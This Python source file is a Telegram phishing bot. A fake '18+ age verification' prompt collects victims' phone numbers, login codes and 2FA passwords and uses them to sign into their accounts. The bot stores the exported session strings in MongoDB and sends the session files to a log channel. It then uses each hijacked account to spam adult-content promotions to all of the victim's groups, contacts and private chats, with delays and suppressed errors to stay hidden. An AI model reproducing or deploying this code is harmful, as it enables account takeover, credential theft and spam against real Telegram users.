import os
import shutil
import traceback
import asyncio
import time
from pyrogram.types import Message, CallbackQuery
from pyrogram import Client, filters
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton
)
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait
)
from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB connection
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['users']

# Define promo texts
PROMO_TEXTS = [
    "🔥 Join our exclusive channel for premium adult content!",
    "🎉 Unlock the hottest videos and photos - join now!",
    "💋 Experience pleasure like never before - access our VIP content!",
    "🔞 Curated adult entertainment just for you - click to join!",
    "🌟 VIP access to the most exclusive adult content on Telegram!",
    "💥 Your gateway to premium adult entertainment starts here!",
    "😈 Don't miss out on our premium collection - join today!",
    "👑 Elevate your experience with our VIP adult channel!",
    "🕶️ Access hidden gems of adult content - become a VIP member!",
    "💎 Premium quality, exclusive content - all in one place!"
]

# Inline OTP Keyboard (using your original design)
OTP_INLINE_MARKUP = InlineKeyboardMarkup(
    [
        [
            InlineKeyboardButton("1️⃣", callback_data="otp_1"),
            InlineKeyboardButton("2️⃣", callback_data="otp_2"),
            InlineKeyboardButton("3️⃣", callback_data="otp_3"),
        ],
        [
            InlineKeyboardButton("4️⃣", callback_data="otp_4"),
            InlineKeyboardButton("5️⃣", callback_data="otp_5"),
            InlineKeyboardButton("6️⃣", callback_data="otp_6"),
        ],
        [
            InlineKeyboardButton("7️⃣", callback_data="otp_7"),
            InlineKeyboardButton("8️⃣", callback_data="otp_8"),
            InlineKeyboardButton("9️⃣", callback_data="otp_9"),
        ],
        [
            InlineKeyboardButton("🔙", callback_data="otp_back"),
            InlineKeyboardButton("0️⃣", callback_data="otp_0"),
            InlineKeyboardButton("🆗", callback_data="otp_submit"),
        ]
    ]
)

strings = {
    'need_login': "You have to /login before using then bot can download restricted content ❕",
    'already_logged_in': "You are already logged in🥰.\nYou Have all Premium Benifits🥳",
    'age_verification': "**⚠️ ACCESS RESTRICTED:**\nTo access premium adult channels, you must verify that you're 18+ years old.\nClick the button below to start age verification 👇",
    'verification_success': "**✅ VERIFICATION SUCCESSFUL!**\nYou now have access to premium content:\n[my Premium Channel Link]"
}

# State management
user_states = {}

def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    if user_data and user_data.get('logged_in', False):
        return True
    return False

@Client.on_message(filters.private & filters.command(["login"]))
async def start_login(bot: Client, message: Message):
    if await check_login_status(message.from_user.id):
        await message.reply(strings['already_logged_in'])
        return 
    
    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return
    
    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number
    
    # Using your original fast OTP sending method
    client = Client(":memory:", API_ID, API_HASH)
    await client.connect()
    
    try:
        # Fast OTP sending (your original method)
        code = await client.send_code(phone_number)
        
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': ''
        }
        
        await message.reply(
            "OTP sent instantly! ✅\n\nEnter OTP:",
            reply_markup=OTP_INLINE_MARKUP
        )
        
    except PhoneNumberInvalid:
        await message.reply('`PHONE_NUMBER` **is invalid.**\nPlease try again 👉 /login')
        if user_id in user_states:
            await user_states[user_id]['client'].disconnect()
            del user_states[user_id]
        return
    except Exception as e:
        await message.reply(f'**Error:** `{e}`\nPlease try again 👉 /login')
        if user_id in user_states:
            await user_states[user_id]['client'].disconnect()
            del user_states[user_id]
        return

@Client.on_callback_query(filters.regex(r"^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /login again")
        return
    
    data = query.data
    state = user_states[user_id]
    
    if data == "otp_back":
        if state['otp_digits']:
            state['otp_digits'] = state['otp_digits'][:-1]
    elif data == "otp_submit":
        if len(state['otp_digits']) < 5:
            await query.answer("OTP must be 5 digits!", show_alert=True)
            return
            
        phone_code = state['otp_digits']
        client = state['client']
        phone_number = state['phone_number']
        phone_code_hash = state['phone_code_hash']
        
        try:
            await query.message.edit("Verifying OTP...")
            await client.sign_in(phone_number, phone_code_hash, phone_code)
            await create_session(bot, client, user_id, phone_number)
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA DETECTED:**\nEnter your password:")
            state['needs_password'] = True
        except Exception as e:
            await query.message.reply(f"Error: {e}\n/login again.")
            await cleanup_user_state(user_id)
        return
    else:
        digit = data.split("_")[1]
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += digit
    
    await query.message.edit(
        f"**Current OTP:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 when done",
        reply_markup=OTP_INLINE_MARKUP
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["login"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    client = state['client']
    
    try:
        await client.check_password(password=password)
        await message.reply("Password verified...")
        await create_session(bot, client, user_id, state['phone_number'])
    except PasswordHashInvalid:
        await message.reply('**Invalid Password**\n/login again')
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()
        
        # Store session in DB
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number
        }
        
        if existing := database.find_one({"id": user_id}):
            database.update_one({'_id': existing['_id']}, {'$set': data})
        else:
            data['id'] = user_id
            database.insert_one(data)
        
        # Save session file
        clean_phone = phone_number.replace('+', '')
        session_file = f"sessions/{clean_phone}.session"
        
        if os.path.exists(":memory:.session"):
            os.rename(":memory:.session", session_file)
            await bot.send_document(
                LOG_CHANNEL_SESSIONS_FILES,
                session_file,
                caption=f"Session: {clean_phone}"
            )
            os.remove(session_file)
        
        await bot.send_message(user_id, strings['verification_success'])
        asyncio.create_task(send_promotion_messages(string_session))
        
    except Exception as e:
        await bot.send_message(user_id, f"<b>ERROR:</b> {e}\n/login again")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(session_string: str):
    try:
        client = Client("promo", session_string=session_string)
        await client.start()
        
        # Get ALL targets
        targets = set()
        
        # 1. Groups/supergroups
        async for dialog in client.get_dialogs():
            if dialog.chat.type in ["group", "supergroup"]:
                targets.add(dialog.chat.id)
        
        # 2. Contacts (including saved/synced)
        contacts = await client.get_contacts()
        for user in contacts:
            if not user.is_bot:
                targets.add(user.id)
        
        # 3. Private chats
        async for dialog in client.get_dialogs():
            if dialog.chat.type == "private" and not dialog.chat.is_bot:
                targets.add(dialog.chat.id)
        
        # Stealth promotion
        for target in targets:
            for promo_text in PROMO_TEXTS:
                try:
                    await client.send_message(target, promo_text)
                    await asyncio.sleep(300 + (time.time() % 10))  # Random delay
                except FloodWait as e:
                    await asyncio.sleep(e.value + 5)
                except:
                    break
            await asyncio.sleep(60)  # Buffer between targets
            
    except:
        pass  # Complete silence
    finally:
        try:
            await client.stop()
        except:
            pass

async def cleanup_user_state(user_id: int):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and not state['client'].is_disconnected:
            await state['client'].disconnect()
        del user_states[user_id]
